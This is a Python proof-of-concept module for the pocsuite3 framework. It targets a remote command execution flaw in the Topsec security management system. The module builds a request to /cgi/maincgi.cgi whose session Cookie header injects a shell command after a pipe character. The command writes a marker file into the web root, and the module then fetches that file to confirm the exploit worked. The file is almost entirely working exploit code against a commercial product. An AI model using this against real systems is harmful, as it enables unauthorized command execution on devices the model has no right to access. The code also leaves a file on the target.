# _*_ coding:utf-8 _*_
# @Time : 2024/1/3


from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class trx_topsec_cookie_rce(POCBase):
    pocDesc = '''天融信TOPSEC安全管理系统远程命令执行漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-3'
    name = '天融信TOPSEC安全管理系统远程命令执行漏洞'

    def _verify(self):

        result = {}
        path = """/cgi/maincgi.cgi?Url=check"""
        path1= "/site/image/security1.txt"
        check_url = self.url + path1
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Cookie": "session_id_443=1|echo '12345678' >> /www/htdocs/site/image/security1.txt;"

        }
        url = self.url + path

        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                response1 = requests.get(check_url)
                if response1.status_code == 200:
                    result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(trx_topsec_cookie_rce)